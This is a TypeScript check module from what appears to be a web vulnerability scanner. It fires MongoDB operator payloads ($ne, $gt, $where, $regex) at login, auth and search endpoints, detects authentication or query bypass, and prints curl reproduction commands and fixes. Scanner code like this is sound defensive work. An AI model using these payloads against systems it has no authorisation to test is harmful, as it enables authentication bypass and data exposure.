import { Check, Finding } from "../core/types.js";

// NoSQL injection payloads for MongoDB/Firestore
const NOSQL_PAYLOADS = [
  {
    name: "$ne Operator",
    value: { $ne: null },
    description: "Bypass authentication or filters",
  },
  {
    name: "$gt Operator",
    value: { $gt: "" },
    description: "Return all records",
  },
  {
    name: "$where Injection",
    value: { $where: "1==1" },
    description: "JavaScript execution in MongoDB",
  },
  {
    name: "$regex Injection",
    value: { $regex: ".*" },
    description: "Bypass string matching",
  },
  {
    name: "$nin Operator",
    value: { $nin: [] },
    description: "Negative match bypass",
  },
  {
    name: "Object Injection",
    value: { $ne: "invalid" },
    description: "Type confusion",
  },
];

const NOSQL_FIELD_PATTERNS = [
  "email",
  "username",
  "password",
  "filter",
  "query",
  "search",
  "where",
  "match",
  "find",
  "id",
  "userId",
];

export const nosqlInjectionCheck: Check = {
  id: "nosql-injection",
  name: "NoSQL Injection (CWE-943)",
  description:
    "Detects NoSQL injection vulnerabilities via object/query manipulation",
  async run({ axios, apiAxios, discoveredRoutes }) {
    const findings: Finding[] = [];

    // Target endpoints that likely use NoSQL queries
    const candidates = discoveredRoutes.filter(
      (r) =>
        ["POST", "PUT", "PATCH"].includes(r.method) &&
        (r.path.includes("login") ||
          r.path.includes("auth") ||
          r.path.includes("search") ||
          r.path.includes("filter") ||
          r.path.includes("query") ||
          r.path.includes("find")),
    );

    for (const route of candidates) {
      const client = route.path.startsWith("/api") ? apiAxios : axios;

      // Determine fields to test
      let testFields: string[] = [];
      if (route.inputs) {
        testFields = Object.keys(route.inputs).filter((k) =>
          NOSQL_FIELD_PATTERNS.some((pattern) =>
            k.toLowerCase().includes(pattern),
          ),
        );
      }
      if (testFields.length === 0) {
        testFields = ["email", "username", "password", "query"];
      }

      for (const field of testFields) {
        // First, establish baseline with normal string
        let baselineRes;
        try {
          baselineRes = await client.request({
            method: route.method,
            url: route.path,
            data: { [field]: "normalValue123" },
            validateStatus: () => true,
          });
        } catch (e) {
          continue;
        }

        const baselineStatus = baselineRes.status;
        const baselineAuth = baselineStatus === 401 || baselineStatus === 403;

        // Now test with NoSQL operator injection
        for (const payload of NOSQL_PAYLOADS) {
          try {
            const injectionData = { [field]: payload.value };

            const res = await client.request({
              method: route.method,
              url: route.path,
              data: injectionData,
              validateStatus: () => true,
            });

            // Detection 1: Authentication bypass (401/403 -> 200)
            if (baselineAuth && res.status >= 200 && res.status < 300) {
              findings.push({
                id: `nosql-injection-auth-bypass-${route.path}-${field}`,
                checkId: "nosql-injection",
                category: "backend",
                name: "NoSQL Injection - Authentication Bypass",
                endpoint: `${route.method} ${route.path}`,
                risk: "critical",
                description: `Field '${field}' accepted NoSQL operator '${payload.name}' and bypassed authentication. Baseline: ${baselineStatus}, Injection: ${res.status}. ${payload.description}.`,
                assumption:
                  "Request body is properly validated and sanitized before database queries.",
                reproduction: `curl -X ${route.method} "${client.defaults.baseURL}${route.path}" -d '{"${field}":${JSON.stringify(payload.value)}}' -H "Content-Type: application/json"`,
                fix: "Never pass req.body directly to database queries. Explicitly validate field types and reject objects. Use strict schemas (Joi, Zod). Example: if (typeof email !== 'string') throw new Error('Invalid type').",
              });
              break;
            }

            // Detection 2: Query bypass - unexpected data returned
            if (res.status === 200 && res.data) {
              const hasUnexpectedData =
                (Array.isArray(res.data) &&
                  res.data.length > 0 &&
                  baselineRes.data?.length === 0) ||
                (res.data.user && !baselineRes.data?.user) ||
                (res.data.token && !baselineRes.data?.token) ||
                (res.data.success === true &&
                  baselineRes.data?.success !== true);

              if (hasUnexpectedData) {
                findings.push({
                  id: `nosql-injection-query-bypass-${route.path}-${field}`,
                  checkId: "nosql-injection",
                  category: "backend",
                  name: "NoSQL Injection - Query Bypass",
                  endpoint: `${route.method} ${route.path}`,
                  risk: "critical",
                  description: `Field '${field}' with operator ${payload.name} returned different data than baseline, indicating query manipulation. The application likely spreads user input directly into queries.`,
                  assumption:
                    "MongoDB/Firestore queries use properly typed parameters.",
                  reproduction: `Inject operator: {"${field}": ${JSON.stringify(payload.value)}}`,
                  fix: "Cast all user inputs to expected types. Use Object.create(null) for query objects. Avoid using {...req.body} in queries. Example: const safeEmail = String(req.body.email);",
                });
                break;
              }
            }

            // Detection 3: Error-based detection
            if (res.status === 500) {
              const bodyStr = JSON.stringify(res.data).toLowerCase();
              if (
                bodyStr.includes("mongo") ||
                bodyStr.includes("firestore") ||
                bodyStr.includes("query") ||
                bodyStr.includes("operator")
              ) {
                findings.push({
                  id: `nosql-injection-error-${route.path}-${field}`,
                  checkId: "nosql-injection",
                  category: "backend",
                  name: "NoSQL Injection - Error-Based",
                  endpoint: `${route.method} ${route.path}`,
                  risk: "high",
                  description: `Field '${field}' with NoSQL operator caused database error, revealing potential injection point.`,
                  assumption: "Input validation prevents malformed queries.",
                  reproduction: `Send: {"${field}": ${JSON.stringify(payload.value)}}`,
                  fix: "Implement strict type checking before database operations. Use schema validation middleware.",
                });
                break;
              }
            }
          } catch (e: any) {
            // Catch errors that might indicate successful injection
            if (e.response?.status === 500 || e.message?.includes("parse")) {
              const description = e.response?.data
                ? JSON.stringify(e.response.data).substring(0, 200)
                : e.message;
              if (
                description.toLowerCase().includes("mongo") ||
                description.toLowerCase().includes("query")
              ) {
                findings.push({
                  id: `nosql-injection-exception-${route.path}-${field}`,
                  checkId: "nosql-injection",
                  category: "backend",
                  name: "NoSQL Injection - Database Exception",
                  endpoint: `${route.method} ${route.path}`,
                  risk: "high",
                  description: `Field '${field}' caused database exception when testing ${payload.name}: ${description}`,
                  assumption: "Database queries are safe from injection.",
                  reproduction: `Exception triggered by NoSQL operator in field '${field}'`,
                  fix: "Validate and sanitize all inputs. Never trust client-provided object structures.",
                });
                break;
              }
            }
          }
        }
      }
    }

    return findings;
  },
};
